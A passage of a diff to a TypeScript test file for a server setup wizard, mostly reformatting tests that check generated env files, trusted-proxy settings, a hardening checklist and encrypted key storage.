-			env.includes('MORPHIT_MATRIX_BOT_ALERT_MXID=@alice:matrix.org'),
-			'MXID line present'
-		);
-		assertTrue(
-			!env.includes('MORPHIT_INDEXER_OPERATOR_MATRIX_ROOM='),
-			'no room line when room is null'
-		);
-		assertTrue(env.includes('# Matrix surfaces'), 'Matrix block heading present');
-	} finally {
-		rmSync(tmp, { recursive: true, force: true });
+scenario(
+	'writeWizardOutput: only MXID populated → only MORPHIT_MATRIX_BOT_ALERT_MXID emitted',
+	() => {
+		const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
+		try {
+			const answers: WizardAnswers = {
+				...sampleAnswers,
+				matrix: { alertMxid: '@alice:matrix.org', groupRoomAlias: null }
+			};
+			writeWizardOutput(answers, tmp);
+			const env = readFileSync(join(tmp, 'morphit.config.env'), 'utf-8');
+			assertTrue(
+				env.includes('MORPHIT_MATRIX_BOT_ALERT_MXID=@alice:matrix.org'),
+				'MXID line present'
+			);
+			assertTrue(
+				!env.includes('MORPHIT_INDEXER_OPERATOR_MATRIX_ROOM='),
+				'no room line when room is null'
+			);
+			assertTrue(env.includes('# Matrix surfaces'), 'Matrix block heading present');
+		} finally {
+			rmSync(tmp, { recursive: true, force: true });
+		}
 	}
-});
+);
 
-scenario('writeWizardOutput: only room populated → only MORPHIT_INDEXER_OPERATOR_MATRIX_ROOM emitted', () => {
-	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
-	try {
-		const answers: WizardAnswers = {
-			...sampleAnswers,
-			matrix: { alertMxid: null, groupRoomAlias: '#agorise:matrix.org' }
-		};
-		writeWizardOutput(answers, tmp);
-		const env = readFileSync(join(tmp, 'morphit.config.env'), 'utf-8');
-		// # is NOT in quote()'s safe-char set (shell-comment hazard) so
-		// the value gets wrapped in quotes.  cp139-C-11: quote() now
-		// uses SINGLE quotes for bash-safety (was double in earlier
-		// audit), and the regex accepts either form for posterity.
-		assertTrue(
-			/^MORPHIT_INDEXER_OPERATOR_MATRIX_ROOM=(['"]?)#agorise:matrix\.org\1$/m.test(env),
-			'room line present (quoted or unquoted)'
-		);
-		assertTrue(
-			!env.includes('MORPHIT_MATRIX_BOT_ALERT_MXID='),
-			'no MXID line when MXID is null'
-		);
-	} finally {
-		rmSync(tmp, { recursive: true, force: true });
+scenario(
+	'writeWizardOutput: only room populated → only MORPHIT_INDEXER_OPERATOR_MATRIX_ROOM emitted',
+	() => {
+		const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
+		try {
+			const answers: WizardAnswers = {
+				...sampleAnswers,
+				matrix: { alertMxid: null, groupRoomAlias: '#agorise:matrix.org' }
+			};
+			writeWizardOutput(answers, tmp);
+			const env = readFileSync(join(tmp, 'morphit.config.env'), 'utf-8');
+			// # is NOT in quote()'s safe-char set (shell-comment hazard) so
+			// the value gets wrapped in quotes.  quote() now
+			// uses SINGLE quotes for bash-safety (was double in earlier
+			// audit), and the regex accepts either form for posterity.
+			assertTrue(
+				/^MORPHIT_INDEXER_OPERATOR_MATRIX_ROOM=(['"]?)#agorise:matrix\.org\1$/m.test(env),
+				'room line present (quoted or unquoted)'
+			);
+			assertTrue(!env.includes('MORPHIT_MATRIX_BOT_ALERT_MXID='), 'no MXID line when MXID is null');
+		} finally {
+			rmSync(tmp, { recursive: true, force: true });
+		}
 	}
-});
+);
 
 scenario('writeWizardOutput: both Matrix surfaces populated → both env lines emitted', () => {
 	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
@@ -1014,9 +1079,7 @@ scenario('writeWizardOutput: both Matrix surfaces populated → both env lines e
 		// the @↔# replacement footgun made manifest.
 		const lines = env.split('\n');
 		const mxidLine = lines.find((l) => l.startsWith('MORPHIT_MATRIX_BOT_ALERT_MXID='));
-		const roomLine = lines.find((l) =>
-			l.startsWith('MORPHIT_INDEXER_OPERATOR_MATRIX_ROOM=')
-		);
+		const roomLine = lines.find((l) => l.startsWith('MORPHIT_INDEXER_OPERATOR_MATRIX_ROOM='));
 		assertTrue(mxidLine !== undefined && /=(['"]?)@/.test(mxidLine), 'MXID line carries @');
 		assertTrue(roomLine !== undefined && /=(['"]?)#/.test(roomLine), 'room line carries #');
 		assertTrue(
@@ -1032,118 +1095,139 @@ scenario('writeWizardOutput: both Matrix surfaces populated → both env lines e
 	}
 });
 
-// ─── cp182 — BunkerWeb trusted-proxy wiring ──────────────────────
+// ─── BunkerWeb trusted-proxy wiring ──────────────────────
 
-scenario('writeWizardOutput: BunkerWeb enabled → MORPHIT_RELAY_TRUSTED_PROXY_IPS=172.20.0.0/16 emitted', () => {
-	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
-	try {
-		const answers: WizardAnswers = {
-			...sampleAnswers,
-			bunkerWeb: { enabled: true }
-		};
-		writeWizardOutput(answers, tmp);
-		// cp193 — trusted-proxy IPs moved to morphit.env (not allowlisted
-		// for morphit.config.env).
-		const env = readFileSync(join(tmp, 'morphit.env'), 'utf-8');
-		assertTrue(
-			env.includes('MORPHIT_RELAY_TRUSTED_PROXY_IPS=172.20.0.0/16'),
-			'active trusted-proxy line present when BunkerWeb chosen'
-		);
-		assertTrue(
-			env.includes('Reverse proxy / trusted client IPs'),
-			'reverse-proxy section heading present'
-		);
-	} finally {
-		rmSync(tmp, { recursive: true, force: true });
+scenario(
+	'writeWizardOutput: BunkerWeb enabled → MORPHIT_RELAY_TRUSTED_PROXY_IPS=172.20.0.0/16 emitted',
+	() => {
+		const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
+		try {
+			const answers: WizardAnswers = {
+				...sampleAnswers,
+				bunkerWeb: { enabled: true }
+			};
+			writeWizardOutput(answers, tmp);
+			// trusted-proxy IPs moved to morphit.env (not allowlisted
+			// for morphit.config.env).
+			const env = readFileSync(join(tmp, 'morphit.env'), 'utf-8');
+			assertTrue(
+				env.includes('MORPHIT_RELAY_TRUSTED_PROXY_IPS=172.20.0.0/16'),
+				'active trusted-proxy line present when BunkerWeb chosen'
+			);
+			assertTrue(
+				env.includes('Reverse proxy / trusted client IPs'),
+				'reverse-proxy section heading present'
+			);
+		} finally {
+			rmSync(tmp, { recursive: true, force: true });
+		}
 	}
-});
+);
 
-scenario('writeWizardOutput: BunkerWeb disabled → trusted-proxy stays commented (no spoofable phantom range)', () => {
-	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
-	try {
-		const answers: WizardAnswers = {
-			...sampleAnswers,
-			bunkerWeb: { enabled: false }
-		};
-		writeWizardOutput(answers, tmp);
-		// cp193 — trusted-proxy IPs moved to morphit.env.
-		const env = readFileSync(join(tmp, 'morphit.env'), 'utf-8');
-		// The active (uncommented) assignment must NOT be present — a
-		// direct client could otherwise spoof X-Forwarded-For.  The
-		// commented hint line (# MORPHIT_RELAY_TRUSTED_PROXY_IPS=) is fine.
-		assertTrue(
-			!/^MORPHIT_RELAY_TRUSTED_PROXY_IPS=/m.test(env),
-			'no active trusted-proxy assignment when serving direct'
-		);
-		assertTrue(
-			env.includes('# MORPHIT_RELAY_TRUSTED_PROXY_IPS='),
-			'commented trusted-proxy hint present for the direct-serve case'
-		);
-	} finally {
-		rmSync(tmp, { recursive: true, force: true });
+scenario(
+	'writeWizardOutput: BunkerWeb disabled → trusted-proxy stays commented (no spoofable phantom range)',
+	() => {
+		const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
+		try {
+			const answers: WizardAnswers = {
+				...sampleAnswers,
+				bunkerWeb: { enabled: false }
+			};
+			writeWizardOutput(answers, tmp);
+			// trusted-proxy IPs moved to morphit.env.
+			const env = readFileSync(join(tmp, 'morphit.env'), 'utf-8');
+			// The active (uncommented) assignment must NOT be present — a
+			// direct client could otherwise spoof X-Forwarded-For.  The
+			// commented hint line (# MORPHIT_RELAY_TRUSTED_PROXY_IPS=) is fine.
+			assertTrue(
+				!/^MORPHIT_RELAY_TRUSTED_PROXY_IPS=/m.test(env),
+				'no active trusted-proxy assignment when serving direct'
+			);
+			assertTrue(
+				env.includes('# MORPHIT_RELAY_TRUSTED_PROXY_IPS='),
+				'commented trusted-proxy hint present for the direct-serve case'
+			);
+		} finally {
+			rmSync(tmp, { recursive: true, force: true });
+		}
 	}
-});
+);
 
-// ─── cp182 — hardening checklist generation ──────────────────────
+// ─── hardening checklist generation ──────────────────────
 
-scenario('writeWizardOutput: hardening opted-in → morphit-hardening-checklist.md written with safety + domain', () => {
-	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
-	try {
-		const answers: WizardAnswers = {
-			...sampleAnswers,
-			hardening: { generateChecklist: true }
-		};
-		const result = writeWizardOutput(answers, tmp);
-		assertTrue(result.hardeningChecklistPath !== null, 'result reports the checklist path');
-		const md = readFileSync(join(tmp, 'morphit-hardening-checklist.md'), 'utf-8');
-		assertTrue(md.includes('# Hardening checklist'), 'checklist title present');
-		assertTrue(md.includes('SSH LOCKOUT SAFETY'), 'SSH lockout-safety callout present');
-		// origin is null in the baseline fixture → placeholder domain.
-		assertTrue(md.includes('<your-domain>'), 'domain placeholder when origin not set');
-		assertTrue(md.includes('OPERATIONS.md §34'), 'points at the UFW/fail2ban reference');
-		// 0644, not 0600 — it is a runbook with no secrets.
-		const mode = statSync(join(tmp, 'morphit-hardening-checklist.md')).mode & 0o777;
-		assertTrue(mode === 0o644, `checklist is 0644 (got ${mode.toString(8)})`);
-	} finally {
-		rmSync(tmp, { recursive: true, force: true });
+scenario(
+	'writeWizardOutput: hardening opted-in → morphit-hardening-checklist.md written with safety + domain',
+	() => {
+		const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
+		try {
+			const answers: WizardAnswers = {
+				...sampleAnswers,
+				hardening: { generateChecklist: true }
+			};
+			const result = writeWizardOutput(answers, tmp);
+			assertTrue(result.hardeningChecklistPath !== null, 'result reports the checklist path');
+			const md = readFileSync(join(tmp, 'morphit-hardening-checklist.md'), 'utf-8');
+			assertTrue(md.includes('# Hardening checklist'), 'checklist title present');
+			assertTrue(md.includes('SSH LOCKOUT SAFETY'), 'SSH lockout-safety callout present');
+			// origin is null in the baseline fixture → placeholder domain.
+			assertTrue(md.includes('<your-domain>'), 'domain placeholder when origin not set');
+			assertTrue(md.includes('OPERATIONS.md §34'), 'points at the UFW/fail2ban reference');
+			// 0644, not 0600 — it is a runbook with no secrets.
+			const mode = statSync(join(tmp, 'morphit-hardening-checklist.md')).mode & 0o777;
+			assertTrue(mode === 0o644, `checklist is 0644 (got ${mode.toString(8)})`);
+		} finally {
+			rmSync(tmp, { recursive: true, force: true });
+		}
 	}
-});
+);
 
-scenario('writeWizardOutput: hardening + BunkerWeb → checklist covers the BunkerWeb edge, not nginx', () => {
-	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
-	try {
-		const answers: WizardAnswers = {
-			...sampleAnswers,
-			bunkerWeb: { enabled: true },
-			hardening: { generateChecklist: true }
-		};
-		writeWizardOutput(answers, tmp);
-		const md = readFileSync(join(tmp, 'morphit-hardening-checklist.md'), 'utf-8');
-		assertTrue(md.includes('AUTO_LETS_ENCRYPT'), 'BunkerWeb TLS path present');
-		assertTrue(md.includes('/etc/bunkerweb'), 'BunkerWeb copy step present');
-		assertTrue(!md.includes('ops/nginx/web.conf'), 'nginx placement omitted when BunkerWeb chosen');
-	} finally {
-		rmSync(tmp, { recursive: true, force: true });
+scenario(
+	'writeWizardOutput: hardening + BunkerWeb → checklist covers the BunkerWeb edge, not nginx',
+	() => {
+		const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
+		try {
+			const answers: WizardAnswers = {
+				...sampleAnswers,
+				bunkerWeb: { enabled: true },
+				hardening: { generateChecklist: true }
+			};
+			writeWizardOutput(answers, tmp);
+			const md = readFileSync(join(tmp, 'morphit-hardening-checklist.md'), 'utf-8');
+			assertTrue(md.includes('AUTO_LETS_ENCRYPT'), 'BunkerWeb TLS path present');
+			assertTrue(md.includes('/etc/bunkerweb'), 'BunkerWeb copy step present');
+			assertTrue(
+				!md.includes('ops/nginx/web.conf'),
+				'nginx placement omitted when BunkerWeb chosen'
+			);
+		} finally {
+			rmSync(tmp, { recursive: true, force: true });
+		}
 	}
-});
+);
 
-scenario('writeWizardOutput: hardening + no BunkerWeb → checklist covers nginx + certbot, not BunkerWeb', () => {
-	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
-	try {
-		const answers: WizardAnswers = {
-			...sampleAnswers,
-			bunkerWeb: { enabled: false },
-			hardening: { generateChecklist: true }
-		};
-		writeWizardOutput(answers, tmp);
-		const md = readFileSync(join(tmp, 'morphit-hardening-checklist.md'), 'utf-8');
-		assertTrue(md.includes('ops/nginx/web.conf'), 'nginx placement present for direct-serve');
-		assertTrue(md.includes('certbot'), 'certbot TLS path present for direct-serve');
-		assertTrue(!md.includes('AUTO_LETS_ENCRYPT'), 'BunkerWeb TLS path omitted when serving direct');
-	} finally {
-		rmSync(tmp, { recursive: true, force: true });
+scenario(
+	'writeWizardOutput: hardening + no BunkerWeb → checklist covers nginx + certbot, not BunkerWeb',
+	() => {
+		const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
+		try {
+			const answers: WizardAnswers = {
+				...sampleAnswers,
+				bunkerWeb: { enabled: false },
+				hardening: { generateChecklist: true }
+			};
+			writeWizardOutput(answers, tmp);
+			const md = readFileSync(join(tmp, 'morphit-hardening-checklist.md'), 'utf-8');
+			assertTrue(md.includes('ops/nginx/web.conf'), 'nginx placement present for direct-serve');
+			assertTrue(md.includes('certbot'), 'certbot TLS path present for direct-serve');
+			assertTrue(
+				!md.includes('AUTO_LETS_ENCRYPT'),
+				'BunkerWeb TLS path omitted when serving direct'
+			);
+		} finally {
+			rmSync(tmp, { recursive: true, force: true });
+		}
 	}
-});
+);
 
 scenario('writeWizardOutput: hardening opted-out → no checklist file written', () => {
 	const tmp = mkdtempSync(join(tmpdir(), 'morphit-init-test-'));
@@ -1171,22 +1255,34 @@ scenario('writeWizardOutput: hardening opted-out → no checklist file written',
 // relay unlocks the encrypted key unattended from a host-bound sealed credential,
 // so there is no reason to offer plaintext). The keystore *reader* still handles
 // a plaintext file defensively — that is separate and intentional.
-scenario('active-key storage is ALWAYS encrypted — no plaintext choice in the wizard or edit-key', () => {
-	const opsCliRoot = join(fileURLToPath(new URL('.', import.meta.url)), '..');
-	const stepsSrc = readFileSync(join(opsCliRoot, 'src', 'init', 'steps.ts'), 'utf-8');
-	const editSrc = readFileSync(join(opsCliRoot, 'src', 'commands', 'editActiveKey.ts'), 'utf-8');
-	assertTrue(!/Two storage options/.test(stepsSrc), 'wizard still offers a plaintext storage choice');
-	assertTrue(/mode: 'encrypted'/.test(stepsSrc), 'wizard no longer produces an encrypted keystore');
-	assertTrue(
-		!/return\s*\{\s*mode: 'plaintext'/.test(stepsSrc.replace(/\s+/g, ' ')),
-		'wizard still returns a plaintext keystore'
-	);
-	assertTrue(/return 'encrypted';/.test(editSrc), 'editActiveKey no longer forces encrypted storage');
-	assertTrue(
-		!/How should the new key be stored\?/.test(editSrc),
-		'editActiveKey still offers a plaintext storage choice'
-	);
-});
+scenario(
+	'active-key storage is ALWAYS encrypted — no plaintext choice in the wizard or edit-key',
+	() => {
+		const opsCliRoot = join(fileURLToPath(new URL('.', import.meta.url)), '..');
+		const stepsSrc = readFileSync(join(opsCliRoot, 'src', 'init', 'steps.ts'), 'utf-8');
+		const editSrc = readFileSync(join(opsCliRoot, 'src', 'commands', 'editActiveKey.ts'), 'utf-8');
+		assertTrue(
+			!/Two storage options/.test(stepsSrc),
+			'wizard still offers a plaintext storage choice'
+		);
+		assertTrue(
+			/mode: 'encrypted'/.test(stepsSrc),
+			'wizard no longer produces an encrypted keystore'
+		);
+		assertTrue(
+			!/return\s*\{\s*mode: 'plaintext'/.test(stepsSrc.replace(/\s+/g, ' ')),
+			'wizard still returns a plaintext keystore'
+		);
+		assertTrue(
+			/return 'encrypted';/.test(editSrc),
+			'editActiveKey no longer forces encrypted storage'
+		);
+		assertTrue(
+			!/How should the new key be stored\?/.test(editSrc),
+			'editActiveKey still offers a plaintext storage choice'
+		);
+	}
+);
 
 console.log(`\n${'─'.repeat(54)}`);
 if (failures === 0) {
